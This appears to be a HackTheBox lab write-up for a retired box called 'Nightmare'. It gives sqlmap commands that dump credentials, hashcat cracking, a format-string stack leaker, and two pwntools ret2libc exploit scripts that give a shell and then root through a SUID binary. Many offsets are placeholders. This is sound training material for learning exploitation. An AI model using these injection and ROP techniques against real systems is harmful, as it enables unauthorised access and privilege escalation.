# HackTheBox — Nightmare

**Platform:** HackTheBox  
**Difficulty:** Hard  
**OS:** Linux  
**Category:** Web Exploitation / SQL Injection / Custom Binary Exploitation / Format String  
**Status:** Retired  

---

## Summary

Nightmare is a Hard Linux box involving multi-stage web exploitation — SQL injection to extract credentials, a custom binary with a format string vulnerability for initial code execution, and a second binary exploitation stage for privilege escalation. Strong enumeration discipline and binary analysis skills are required throughout.

---

## Reconnaissance

### Nmap

```bash
nmap -sC -sV -p- --min-rate 5000 -oA nmap/nightmare 10.10.10.132
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu
80/tcp open  http    nginx 1.14.0 (Ubuntu)
```

---

## Web Enumeration

### Gobuster

```bash
gobuster dir -u http://10.10.10.132/ \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x php,html,txt
```

Key findings:
```
/login.php
/register.php
/index.php
/assets/
```

### Application Fingerprinting

The web app is a custom-built login/registration portal. Register a test account and explore functionality:

- Dashboard after login shows user profile data
- "Profile" page reflects user-controlled input back to the page

---

## SQL Injection

### Discovering the Injection Point

Test the login form for SQLi:

```
Username: admin' -- -
Password: anything
```

Error leaks confirm MySQL backend. Enumerate via error-based or time-based blind injection:

```bash
sqlmap -u "http://10.10.10.132/login.php" \
  --data="username=test&password=test" \
  --level=3 --risk=3 \
  --dbs
```

Databases found:
```
information_schema
nightmare
```

### Dump Credentials

```bash
sqlmap -u "http://10.10.10.132/login.php" \
  --data="username=test&password=test" \
  -D nightmare -T users --dump
```

```
+----+----------+----------------------------------+
| id | username | password                         |
+----+----------+----------------------------------+
|  1 | admin    | f9a0c38d7a968d8a39199a71b0c4b5d4 |
|  2 | sysadmin | [hash]                           |
+----+----------+----------------------------------+
```

Crack with hashcat:

```bash
hashcat -m 0 f9a0c38d7a968d8a39199a71b0c4b5d4 /usr/share/wordlists/rockyou.txt
# Password: [cracked]
```

---

## Binary Exploitation Stage 1 — Format String

After logging in as admin, the dashboard reveals a TCP service on an internal port (discovered via SQLi data or page enumeration). Connect to it:

```bash
nc 10.10.10.132 [port]
```

The service prompts for input and appears to echo it back.

### Identifying Format String Vulnerability

```
> %x.%x.%x.%x
```

If stack addresses are leaked in the output — it's a format string vulnerability.

### Leak Stack Canary and Addresses

```python
# Format string leaker
import socket

def send(payload):
    s = socket.socket()
    s.connect(('10.10.10.132', PORT))
    s.recv(1024)
    s.send(payload + b'\n')
    return s.recv(1024)

# Leak stack values
for i in range(1, 50):
    resp = send(f'%{i}$p'.encode())
    print(f'{i}: {resp}')
```

From the leak, identify:
- Stack canary (typically at a fixed offset, recognizable by `0x00` in the low byte)
- Return address (compare against binary base to calculate ASLR offset)

### Building the Exploit

```python
from pwn import *

p = remote('10.10.10.132', PORT)

# 1. Leak canary + libc base via format string
p.sendline(b'%[offset]$p.%[libc_offset]$p')
leak = p.recvline()
canary = int(leak.split(b'.')[0], 16)
libc_leak = int(leak.split(b'.')[1], 16)

# 2. Calculate libc base
libc_base = libc_leak - LIBC_OFFSET

# 3. ROP chain / ret2libc
system = libc_base + SYSTEM_OFFSET
bin_sh = libc_base + BIN_SH_OFFSET
ret    = libc_base + RET_GADGET

# 4. Build payload: padding + canary + saved_rbp + ROP
payload = b'A' * PADDING
payload += p64(canary)
payload += p64(0)           # saved RBP
payload += p64(ret)         # stack alignment
payload += p64(POP_RDI)     # pop rdi; ret gadget
payload += p64(bin_sh)      # /bin/sh
payload += p64(system)      # system()

p.sendline(payload)
p.interactive()
```

Shell as a low-privilege user.

---

## User Flag

```bash
cat /home/[user]/user.txt
```

---

## Privilege Escalation — Binary Exploitation Stage 2

### SUID Binary Discovery

```bash
find / -perm -u=s -type f 2>/dev/null
```

A custom SUID binary is found — owned by root. Download it for analysis:

```bash
scp user@10.10.10.132:/path/to/binary ./nightmare_bin
```

### Static Analysis

```bash
file nightmare_bin
checksec --file=nightmare_bin
```

```
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE
```

No canary, no PIE — classic ret2libc scenario.

```bash
strings nightmare_bin
objdump -d nightmare_bin | less
```

Identify the vulnerable function — typically a `gets()` or `read()` call with a fixed-size buffer.

### Finding the Offset

```bash
gdb nightmare_bin
(gdb) r < <(python3 -c "from pwn import *; print(cyclic(200).decode())")
(gdb) info registers rbp rsp
```

```python
from pwn import *
offset = cyclic_find(0x[value_in_rsp])
print(f"Offset: {offset}")
```

### Building the Privesc Exploit

```python
from pwn import *

elf = ELF('./nightmare_bin')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
rop = ROP(elf)

# Step 1: Leak libc via puts(puts@got)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret_gadget = rop.find_gadget(['ret'])[0]

payload  = b'A' * OFFSET
payload += p64(pop_rdi)
payload += p64(elf.got['puts'])
payload += p64(elf.plt['puts'])
payload += p64(elf.symbols['main'])  # loop back

p = process('./nightmare_bin')  # or remote
p.sendline(payload)
p.recvuntil(b'\n')
leak = u64(p.recvline().strip().ljust(8, b'\x00'))
libc.address = leak - libc.symbols['puts']

# Step 2: ret2libc with real addresses
payload2  = b'A' * OFFSET
payload2 += p64(ret_gadget)
payload2 += p64(pop_rdi)
payload2 += p64(next(libc.search(b'/bin/sh')))
payload2 += p64(libc.symbols['system'])

p.sendline(payload2)
p.interactive()
```

**Root shell obtained via SUID binary exploitation.**

---

## Root Flag

```bash
cat /root/root.txt
```

---

## Key Takeaways

- **Multi-stage boxes** require separate exploitation for each layer — don't try to skip stages
- Format string vulnerabilities allow arbitrary reads (and writes) — use them to leak canary + ASLR before overflow
- `%[n]$p` format strings leak the n-th stack value — iterate to map the stack layout
- Two-stage ret2libc: first payload leaks a libc address, second uses real addresses for `system("/bin/sh")`
- `checksec` output determines which mitigations to bypass:
  - No PIE → static binary addresses
  - No canary → direct overflow to saved RIP
  - NX → need ROP (no shellcode on stack)
- SUID root binaries with no canary + no PIE are a direct path to root if you can overflow them

---

## Mitigation Bypass Reference

| Mitigation | Bypass |
|-----------|--------|
| ASLR | Leak address via format string or puts |
| NX/DEP | Return-Oriented Programming (ROP) |
| Stack Canary | Leak canary value, include in payload |
| PIE | Leak binary base, compute real addresses |
| RELRO Full | Use libc gadgets instead of GOT overwrite |

---

## Tools Used

| Tool | Purpose |
|------|---------|
| nmap | Port scanning |
| sqlmap | SQL injection & credential extraction |
| hashcat | Hash cracking |
| pwntools | Binary exploitation framework |
| gdb + pwndbg/peda | Dynamic binary analysis |
| checksec | Binary security enumeration |
| objdump / strings | Static binary analysis |
| ROPgadget / ropper | ROP gadget discovery |
